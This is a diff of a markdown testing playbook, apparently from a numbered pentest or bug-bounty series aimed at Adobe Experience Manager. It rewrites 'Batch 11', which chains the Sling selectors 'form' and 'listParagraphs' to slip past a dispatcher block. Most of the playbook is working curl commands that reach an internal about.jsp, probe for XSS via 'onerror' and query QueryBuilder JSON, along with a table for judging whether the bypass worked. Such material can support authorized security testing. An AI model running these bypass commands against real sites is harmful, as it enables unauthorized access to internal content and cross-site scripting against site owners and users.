@@ -1,34 +1,43 @@
-# Batch 11 — Chain selectors (`form` → `listParagraphs`)
+# Batch 11 — Stack two cheat codes
 
-## objective
+## GOAL
+Put `form` on the outside and `listParagraphs` on the inside so blocked selectors still run.
 
-Combine **two** gadgets: outer `form` (suffix forward / extension camouflage) + inner `listParagraphs` (internal render).  
-Stay on selector chaining only — no Forms product, no package mining.
+## TIME
+~45–75 min
 
-## estimated_time
+## YOU NEED
+- Tried 06 and 10
 
-45–75 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- Batch 06 and/or 10 attempted
-- `PAGE` known
+Sometimes the guard blocks the word `listParagraphs` in the URL.  
+`form` can hide the real work in the **suffix**.  
+Guard sees: `page.form.js`  
+App runs: the listParagraphs URL that follows.
 
-## testing_workflow
+Two simple tools stacked = one stronger tool. That is all.
 
-### 1) Technique A — form wraps listParagraphs (about.jsp)
+---
+
+## DO THIS
 
 ```bash
-T="https://TARGET"
+T="https://PUT-THE-SITE-HERE"
 PAGE="/content/YOUR/PAGE"
-
-# Outer path uses form + harmless ext; suffix is the listParagraphs URL
-curl -sk -o /tmp/ch.html -w "%{http_code} %{size_download}\n" \
-  "$T${PAGE}.form.js${PAGE}.listParagraphs.html?itemResourceType=/libs/granite/ui/components/shell/help/about/about.jsp&limit=1"
-head -c 500 /tmp/ch.html; echo
 ```
 
-### 2) Technique B — same chain with XSS path param
+### 1) form → about.jsp
+
+```bash
+curl -sk -o /tmp/ch.html -w "%{http_code} bytes=%{size_download}\n" \
+  "$T${PAGE}.form.js${PAGE}.listParagraphs.html?itemResourceType=/libs/granite/ui/components/shell/help/about/about.jsp&limit=1"
+head -c 400 /tmp/ch.html; echo
+```
+
+### 2) form → XSS path
 
 ```bash
 curl -sk -o /tmp/ch.html -w "%{http_code}\n" \
@@ -36,29 +45,25 @@ curl -sk -o /tmp/ch.html -w "%{http_code}\n" \
 grep -i onerror /tmp/ch.html | head
 ```
 
-### 3) Technique C — form → QueryBuilder suffix (confirm still works under chain mindset)
+### 3) form → QueryBuilder (confirm)
 
 ```bash
-curl -sk -o /tmp/ch.json -w "%{http_code} %{size_download}\n" \
+curl -sk -o /tmp/ch.json -w "%{http_code} bytes=%{size_download}\n" \
   "$T${PAGE}.form.css/bin/querybuilder.json?path=/content&p.limit=2"
-head -c 300 /tmp/ch.json; echo
+head -c 250 /tmp/ch.json; echo
 ```
 
-If 06 already proved this, treat as 10-minute confirmation only.
+---
 
-## decision_points
+## IF / THEN
 
-| If… | Then… |
-|-----|--------|
-| Chain bypasses a block that 10 hit alone | High-value finding — write up clearly |
-| Nothing new | Close selector track; go **12** or **15** |
-| form dead, listParagraphs alive | No more time on chains |
+| What you saw | What you do |
+|--------------|-------------|
+| Chain works where 10 alone failed | Big finding — write clear PoC |
+| Nothing new | Close selector track |
 
-## expected_findings
+---
 
-- Multi-layer dispatcher bypass + XSS/internal access
-
-## next_batch_to_continue_with
-
-→ **[12-forms-surface.md](./12-forms-surface.md)** if Forms possible  
-else → **[15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)**
+## NEXT
+- Forms from batch 01 → [12-forms-surface.md](./12-forms-surface.md)  
+- No Forms → [15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)
